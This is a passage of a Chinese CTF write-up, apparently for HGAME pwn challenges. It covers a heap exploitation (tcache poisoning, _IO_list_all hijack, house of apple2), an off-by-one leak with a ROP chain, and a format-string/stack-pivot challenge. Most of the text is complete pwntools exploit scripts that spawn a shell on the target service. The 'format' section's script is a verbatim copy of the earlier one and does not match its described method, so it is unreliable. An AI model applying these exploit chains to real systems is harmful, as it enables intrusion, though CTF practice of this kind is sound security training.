
1. 首先通过 `top chunk` 合并，再申请泄露 `libc` 和 `heap` 的地址。
2. 再通过任意地址 `free` 来劫持 `teacher bin` 的 `fd`，实现任意地址 `malloc`。
3. 劫持 `io_list_all`，之后打 `house of apple2`，来写 `one_gadget`。

完整的exp

```
from pwn import *
elf = ELF("./vuln")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
libc = ELF('./libc.so.6')
flag=0
url='node1.hgame.vidar.club'
port=30911
if flag:
    p = process(elf.path)
else:
    p = remote(url,port)
sa = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
it = lambda : p.interactive()
uu32 = lambda : u32(p.recvuntil(b'\xff')[-4:].ljust(4,b'\x00'))
uu64 = lambda : u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
uu64_h= lambda : u64(p.recvuntil(('\x55','\x56'))[-6:].ljust(8,b'\x00'))
ru = lambda x :p.recvuntil(x)
rc = lambda x :p.recv(x)
sd = lambda x:p.send(x)
sl = lambda x:p.sendline(x)
lg = lambda s : log.info('\x1b[01;38;5;214m %s --> 0x%x \033[0m' % (s, eval(s)))
def cmd(idx):
    sla(b'>',str(idx))
def add(idx,name,size,msg):
    cmd(1)
    sla(b'>',str(idx))
    sla(b'>',name)
    sla(b'>',str(size))
    sa(b'>', msg)
def delete(idx):
    cmd(2)
    sla(b'>', str(idx))
def edit(idx,idx2,name,size,msg):
    cmd(3)
    sla(b'>', str(idx))
    sla(b'>', str(idx2))
    sla(b'>', name)
    sla(b'>', str(size))
    sa(b'>', msg)
def show(idx):
    cmd(4)
    sla(b'>', str(idx))
def gift():
    cmd(1)
    sla(b'>', b'10')
    sla(b'>', b'name')
    sla(b'>', b'-10')
for i in range(9):
    add(i,b'xxj',128,b"a"*0x18)
for i in range(9):
    delete(0)
# gdb.attach(p)
add(0,b'xxj',0x30,b"a")
show(0)
ru(b'Information: ')
libc.address=uu64()-0x21ad61
lg('libc.address')
edit(0,0,b'xxj',0x30,b'a'*0x10)
show(0)
ru(b'a'*0x10)
heap=uu64_h()
heap_base=heap-0x810
lg('heap')
lg('heap_base')
delete(1)
_io_list_all=libc.sym['_IO_list_all']
lg('_io_list_all')
add(0,p64(heap_base),0x20,b'c'*0x10+p64(heap_base+0xc20))
add(1,b'xxj',0x3f0,b'a')
add(1,b'xxj',0x3f0,b'\x00'*0x100+p64(0x400)+p64(0x3f0))
delete(1)
gift()
sla(b'>',str(hex(heap_base+(0xd30))))
tls=libc.address-0x28c0
tls_dtor_lis=tls-88
lg(b'tls')
lg(b'tls_dtor_lis')
magic=libc.address+0x21bf00
fd=((heap_base>>12)^(_io_list_all-0x10))
edit(1,1,b'xxj',0x3f0,b'b'*0x100+p64(0x400)+p64(fd))
heap2=heap_base+0xd38-0x10
setcontext = libc.sym['setcontext']
wfile=libc.address+0x2170c0
magic=0x000000000016a06a+libc.address#: mov rbp, qword ptr [rdi + 0x48]; mov rax, qword ptr [rbp + 0x18]; lea r13, [rbp + 0x10]; mov dword ptr [rbp + 0x10], 0; mov rdi, r13; call qword ptr [rax + 0x28];
leave=0x000000000004da83+libc.address #: leave ; ret
pop_rdi=0x000000000002a3e5 +libc.address#: pop rdi ; ret
one_gadget=[0xebc81][0]+libc.address
fake_file = b''
fake_file = p64(0)+p64(1)
fake_file = fake_file.ljust(0x28,b'\x00')+p64(heap2+0xe8)
fake_file = fake_file.ljust(0x48,b'\x00')+p64(magic)
fake_file = fake_file.ljust(0x80,b'\x00')+p64(heap2)
fake_file = fake_file.ljust(0xb8,b'\x00')+p64(wfile)+p64(heap2)
payload = b'\x00'*0x10+fake_file
payload += p64(pop_rdi)*2+p64(libc.search('/bin/sh\x00').__next__())+p64(heap2+0xe8)+p64(one_gadget)*2
add(1,b'xxj',0x3f0,payload)
add(1,b'xxj',0x3f0,b'a'*8+p64(heap_base+0xd38-0x10))
# gdb.attach(p,'b *{}\nc'.format(libc.address+0x86390))
# pause()
cmd(5)
it()
```

# Week1

## 1、counting petals

先查看程序开启的保护，发现保护全开

![](https://bbs.kanxue.com/upload/attach/202502/1013687_NYE5B6M5MWEBSZW.png)

代码审计，我们发现存在一个 `off-by-one` 溢出，可以直接覆盖到 `v8`

![](https://bbs.kanxue.com/upload/attach/202502/1013687_WFE3HC3HTPZF823.png)

上面是依次输入，下面会一一打印我们输入的内容

![](https://bbs.kanxue.com/upload/attach/202502/1013687_S9AWFNKZHBEXHZ5.png)

最后判断是否继续循环

![](https://bbs.kanxue.com/upload/attach/202502/1013687_RVU77DJHVUDJUR5.png)

首先我们通过 `off-by-one` 修改 `v8` 和 `v9` 的数值，从而泄露 `libc` 的地址和 `canary` 的数值。我们只要修改 `v9` 大于 `v8`，就可以通过打印出 `libc` 的地址和 `canary`，同时也要算好偏移

![](https://bbs.kanxue.com/upload/attach/202502/1013687_3ZQWYBW5S9YGZJK.png)

![](https://bbs.kanxue.com/upload/attach/202502/1013687_KBHYEDUFTFCREAV.png)

然后我们用同样的方法劫持返回地址，写 `ROP` 链即可拿到 `shell`

![](https://bbs.kanxue.com/upload/attach/202502/1013687_WA94V4EZ5ESU5HM.png)

完整的exp

```
from pwn import *
elf = ELF("./vuln")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
libc = ELF('./libc.so.6')
flag=1
url='119.45.235.21'
port=32582
if flag:
    p = process(elf.path)
else:
    p = remote(url,port)
sa = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
it = lambda : p.interactive()
uu32 = lambda : u32(p.recvuntil(b'\xff')[-4:].ljust(4,b'\x00'))
uu64 = lambda : u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
uu64_h= lambda : u64(p.recvuntil(('\x55','\x56'))[-6:].ljust(8,'\x00'))
ru = lambda x :p.recvuntil(x)
rc = lambda x :p.recv(x)
sd = lambda x:p.send(x)
sl = lambda x:p.sendline(x)
lg = lambda s : log.info('\x1b[01;38;5;214m %s --> 0x%x \033[0m' % (s, eval(s)))
def edit(date):
    sla(b': ',date)
    sla(b'time?',str(16))
    # sla(b': ',)
for i in range(15):
    edit(str(1))
# edit('77309411345')

edit(b'85899345939')
sla(b'latter:',b'1')
ru(b'85899345939 + ')
canary=int(ru(b' +')[:-2],10)
# info(canary)
lg('canary')
ru(b'1 + ')
libc.address=int(ru(b' +')[:-2],10)-0x29d90
lg('libc.address')
sla(b'time?',str(16))
pop_rdi=0x000000000002a3e5 + libc.address #: pop rdi ; ret
ret=0x0000000000029139+libc.address #: ret
sys=libc.sym['system']
bin_sh=libc.search('/bin/sh\x00').__next__()
for i in range(15):
    edit(str(1))
edit(b'77309411350')
gdb.attach(p,'b *$rebase(0x01464)\n')
pause()
sla(b': ',str(ret))
sla(b': ',str(pop_rdi))
sla(b': ',str(bin_sh))
sla(b': ',str(sys))
sla(b'latter:',b'2')
it()
```

## 2、format

首先我们先查看程序开启的保护

![](https://bbs.kanxue.com/upload/attach/202502/1013687_3Q56UB58JYEK7A5.png)

代码审计，首先存在一个格式化字符串漏洞，但是只能输入三个字符，所以没法任意地址泄露

![](https://bbs.kanxue.com/upload/attach/202502/1013687_48FTQR2SCXXTFSH.png)

之后存在一个整数溢出 `v5` 变量，我们跟进 `vlun`，发现可以通过整数溢出，从而造成栈溢出漏洞

![](https://bbs.kanxue.com/upload/attach/202502/1013687_S7EBD9ANA575ER4.png)

![](https://bbs.kanxue.com/upload/attach/202502/1013687_HJZTUCVCZ5NTNEP.png)

但是没有给我们 `pop rdi` 的 gadget，所以没法直接通过 `put` 函数泄露 `libc` 的地址

![](https://bbs.kanxue.com/upload/attach/202502/1013687_CRVQAWYVH9W2V6M.png)

由于上面存在一个格式化字符串漏洞，输入三个字符正好可以输入 `%p`，从而泄露一个栈地址

![](https://bbs.kanxue.com/upload/attach/202502/1013687_JPCNVTNQ6FAUJ5X.png)

我们可以通过栈溢出劫持 `rbp` 为 `buf+0x10` 的地址，然后劫持返回地址为格式化字符串漏洞的地址，从而实现任意地址泄露。由于 `rdi` 是 `rbp-0x10` 地址的数据，我们要劫持 `rbp` 为 `buf+0x10` 的位置，从而泄露 `libc` 的地址

![](https://bbs.kanxue.com/upload/attach/202502/1013687_HYMKMY5Q96EUS8G.png)

之后再通过栈溢出漏洞 `getshell` 即可，但是要多打几次，有时候会崩栈

![](https://bbs.kanxue.com/upload/attach/202502/1013687_TBYBB97SZKGEGKE.png)

完整的exp

```
from pwn import *
elf = ELF("./vuln")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
libc = ELF('./libc.so.6')
flag=1
url='119.45.235.21'
port=32582
if flag:
    p = process(elf.path)
else:
    p = remote(url,port)
sa = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
it = lambda : p.interactive()
uu32 = lambda : u32(p.recvuntil(b'\xff')[-4:].ljust(4,b'\x00'))
uu64 = lambda : u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
uu64_h= lambda : u64(p.recvuntil(('\x55','\x56'))[-6:].ljust(8,'\x00'))
ru = lambda x :p.recvuntil(x)
rc = lambda x :p.recv(x)
sd = lambda x:p.send(x)
sl = lambda x:p.sendline(x)
lg = lambda s : log.info('\x1b[01;38;5;214m %s --> 0x%x \033[0m' % (s, eval(s)))
def edit(date):
    sla(b': ',date)
    sla(b'time?',str(16))
    # sla(b': ',)
for i in range(15):
    edit(str(1))
# edit('77309411345')

edit(b'85899345939')
sla(b'latter:',b'1')
ru(b'85899345939 + ')
canary=int(ru(b' +')[:-2],10)
# info(canary)
lg('canary')
ru(b'1 + ')
libc.address=int(ru(b' +')[:-2],10)-0x29d90
lg('libc.address')
sla(b'time?',str(16))
pop_rdi=0x000000000002a3e5 + libc.address #: pop rdi ; ret
ret=0x0000000000029139+libc.address #: ret
sys=libc.sym['system']
bin_sh=libc.search('/bin/sh\x00').__next__()
for i in range(15):
    edit(str(1))
edit(b'77309411350')
gdb.attach(p,'b *$rebase(0x01464)\n')
pause()
sla(b': ',str(ret))
sla(b': ',str(pop_rdi))
sla(b': ',str(bin_sh))
sla(b': ',str(sys))
sla(b'latter:',b'2')
it()
```
